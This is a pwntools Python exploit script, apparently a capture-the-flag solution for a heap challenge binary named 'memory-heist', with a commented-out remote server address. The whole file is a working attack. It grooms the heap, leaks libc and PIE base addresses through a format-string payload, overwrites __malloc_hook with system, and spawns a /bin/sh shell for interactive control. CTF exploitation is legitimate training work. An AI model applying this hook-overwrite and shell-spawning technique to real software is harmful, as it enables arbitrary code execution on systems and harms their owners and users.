from pwn import *

elf = ELF("./memory-heist")
libc = elf.libc

target = process(elf.path)
#target = remote("35.244.10.136", 10253)

def sla(s, d):
	target.sendlineafter(s, d)

def add(idx, size, content):
	sla(">", "1")
	sla(">", str(idx))
	sla(">", str(size))
	sla(">", content)

def rem(idx):
	sla(">", "2")
	sla(">", str(idx))

def show(idx):
	sla(">", "3")
	sla(">", "Y")
	sla(">", str(idx))

add(0, 0x410, "A"*0x28)
add(2, 0x410, "B"*0x48)
add(4, 0x68, "C"*0x18)
add(6, 0x68, "D"*0x18)

rem(0)
rem(2)

add(8, 0x3c0, "%17$lx\n%6$lx\n")
add(1, 0x68, "J"*0x48 + p64(0x521))

rem(2)
rem(6)
rem(4)

add(10, 0x420, "K"*0x18)
rem(4)

show(8)

target.recvuntil(":")
libc.address = int(target.recvline().strip(), 0x10) - libc.sym['__libc_start_main'] - 243
log.info("LIBC Base: " + hex(libc.address))

elf.address = int(target.recvline().strip(), 0x10) - 0x55d2097cf1d0 + 0x000055d2097ce000
log.info("PIE Base: " + hex(elf.address))

add(5, 0x68, p64(libc.sym['__malloc_hook']))
add(7, 0x68, "JUNK")

add(9, 0x68, p64(libc.sym['system']))

sla(">", "1")
sla(">", str(3))
sla(">", str(libc.search("/bin/sh\x00").next() - 2))

target.interactive()